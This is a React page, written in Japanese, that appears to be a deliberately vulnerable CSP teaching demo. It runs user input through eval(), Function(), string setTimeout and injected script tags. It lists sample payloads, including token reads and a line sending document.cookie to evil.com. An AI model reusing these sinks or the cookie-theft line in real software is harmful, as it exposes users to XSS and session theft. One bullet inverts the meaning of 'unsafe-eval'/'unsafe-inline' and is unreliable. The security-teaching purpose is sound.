'use client';

import { useState } from 'react';
import DemoLayout from '@/components/DemoLayout';
import CodeExecutionTestForm from '../components/CodeExecutionTestForm';
import TestResultsDisplay from '../components/TestResultsDisplay';

export default function VulnerableInlineScriptPage() {
  const [userCode, setUserCode] = useState('alert("Hello World!");');
  const [evalResults, setEvalResults] = useState<string[]>([]);

  const executeEval = () => {
    try {
      // 危険！ユーザー入力をeval()で実行
      const result = eval(userCode);
      setEvalResults(prev => [...prev, `✅ eval()実行成功: ${userCode} → ${result}`]);
    } catch (error) {
      setEvalResults(prev => [...prev, `❌ eval()実行エラー: ${error}`]);
    }
  };

  const executeFunction = () => {
    try {
      // 危険！Functionコンストラクタでコード実行
      const dynamicFunction = new Function(userCode);
      const result = dynamicFunction();
      setEvalResults(prev => [...prev, `✅ Function()実行成功: ${userCode} → ${result}`]);
    } catch (error) {
      setEvalResults(prev => [...prev, `❌ Function()実行エラー: ${error}`]);
    }
  };

  const executeTimeout = () => {
    try {
      // 危険！setTimeout()でコード実行
      setTimeout(userCode, 100);
      setEvalResults(prev => [...prev, `✅ setTimeout()実行: ${userCode}`]);
    } catch (error) {
      setEvalResults(prev => [...prev, `❌ setTimeout()実行エラー: ${error}`]);
    }
  };

  const injectInlineScript = () => {
    // 危険！動的にインラインスクリプトを追加
    const script = document.createElement('script');
    script.innerHTML = userCode;
    document.head.appendChild(script);
    setEvalResults(prev => [...prev, `⚠️ インラインスクリプト注入: ${userCode}`]);
  };

  return (
    <DemoLayout
      title="インラインスクリプト・evalの禁止 - CSP無効版"
      description="このページではCSPが設定されていないため、eval()、Function()、インラインスクリプトなどの危険なコード実行が可能です。"
      isSecure={false}
    >
      <div className="space-y-6">
        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
          <h3 className="font-semibold text-yellow-800 mb-2">インラインスクリプトとeval()の危険性：</h3>
          <p className="text-yellow-700 mb-4">
            インラインスクリプトやeval()は、XSS攻撃者が任意のJavaScriptコードを実行するための
            主要な手段となります。CSPにより、これらの実行を禁止することができます。
          </p>
          
          <div className="bg-red-100 p-3 rounded text-sm">
            <strong>⚠️ 攻撃の例：</strong>
            <ul className="list-disc list-inside mt-2 space-y-1">
              <li>ユーザー入力を通じたeval()によるコード注入</li>
              <li>動的に生成されたインラインスクリプトの実行</li>
              <li>setTimeout/setInterval を使った文字列コードの実行</li>
              <li>Functionコンストラクタによる動的コード生成</li>
            </ul>
          </div>
        </div>

        <div className="bg-orange-50 border border-orange-200 rounded-lg p-4">
          <h3 className="font-semibold text-orange-800 mb-2">危険なコード実行のテスト：</h3>
          <p className="text-orange-700 mb-2">以下のような悪意のあるコードを試してみてください：</p>
          <div className="space-y-2 text-sm">
            <div className="bg-gray-100 p-2 rounded font-mono">
              document.cookie  // Cookie情報の取得
            </div>
            <div className="bg-gray-100 p-2 rounded font-mono">
              {`fetch('/api/user').then(r=>r.json()).then(console.log)  // API呼び出し`}
            </div>
            <div className="bg-gray-100 p-2 rounded font-mono">
              localStorage.getItem('token')  // ローカルストレージの情報取得
            </div>
            <div className="bg-gray-100 p-2 rounded font-mono">
              window.location='https://evil.com/?data='+document.cookie  // データ漏洩
            </div>
          </div>
        </div>

        {/* コード実行テスト */}
        <CodeExecutionTestForm
          userCode={userCode}
          setUserCode={setUserCode}
          onEvalTest={executeEval}
          onFunctionTest={executeFunction}
          onTimeoutTest={executeTimeout}
          onInlineScriptTest={injectInlineScript}
          isSecure={false}
        />

        {/* 既存のインラインスクリプト例 */}
        <div className="border rounded-lg p-6 bg-red-50">
          <h3 className="text-lg font-semibold mb-4 text-red-800">⚡ ページに埋め込まれたインラインスクリプト</h3>
          
          <div className="space-y-4">
            <div className="p-4 border border-red-300 rounded bg-white">
              <h4 className="font-medium text-red-800 mb-2">1. イベントハンドラインライン</h4>
              <div className="text-sm space-y-2">
                <button 
                  onClick={() => alert('インラインイベントハンドラが実行されました！')}
                  className="bg-red-500 text-white px-3 py-1 rounded text-xs"
                >
                  危険なボタン（onclickインライン）
                </button>
                <div className="bg-gray-100 p-2 rounded font-mono text-xs">
                  {`<button onclick="alert('攻撃!')">ボタン</button>`}
                </div>
              </div>
            </div>
            
            <div className="p-4 border border-orange-300 rounded bg-white">
              <h4 className="font-medium text-orange-800 mb-2">2. javascript: プロトコル</h4>
              <div className="text-sm space-y-2">
                <a 
                  href="javascript:alert('javascript:プロトコル実行！'); void(0);"
                  className="text-orange-600 underline text-xs"
                >
                  危険なリンク（javascript:プロトコル）
                </a>
                <div className="bg-gray-100 p-2 rounded font-mono text-xs">
                  {`<a href="javascript:alert('攻撃!')">リンク</a>`}
                </div>
              </div>
            </div>
            
            <div className="p-4 border border-purple-300 rounded bg-white">
              <h4 className="font-medium text-purple-800 mb-2">3. インラインstyleでのJavaScript（IE限定）</h4>
              <div className="text-sm space-y-2">
                <div className="text-xs">
                  <div className="bg-gray-100 p-2 rounded font-mono">
                    {`<div style="background:expression(alert('CSS Expression!'))">IE限定攻撃</div>`}
                  </div>
                  <p className="text-purple-600 mt-1">※ 現代のブラウザではブロックされます</p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* 実行結果表示 */}
        <TestResultsDisplay results={evalResults} isSecure={false} />

        <div className="bg-red-50 border border-red-200 rounded-lg p-4">
          <h3 className="font-semibold text-red-800 mb-2">⚠️ この実装の問題点：</h3>
          <ul className="text-red-700 space-y-1 list-disc list-inside">
            <li>CSP の <code>script-src</code> に <code>'unsafe-eval'</code> や <code>'unsafe-inline'</code> が設定されていない</li>
            <li><code>eval()</code> や <code>Function()</code> の実行が制限されていない</li>
            <li>インラインイベントハンドラが実行可能</li>
            <li>動的スクリプト生成への対策なし</li>
            <li>XSS攻撃の主要な実行経路が開放されている</li>
          </ul>
        </div>

        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
          <h3 className="font-semibold text-blue-800 mb-2">🔍 攻撃の検出方法：</h3>
          <ul className="text-blue-700 space-y-1 list-disc list-inside">
            <li>ブラウザ開発者ツールのConsoleで実行されるコードを監視</li>
            <li>Networkタブで不正な外部通信を確認</li>
            <li>Elementsタブで動的に追加されたscript要素を確認</li>
            <li>セキュリティ監査ツールでインラインスクリプトを検出</li>
          </ul>
        </div>
      </div>
    </DemoLayout>
  );
}
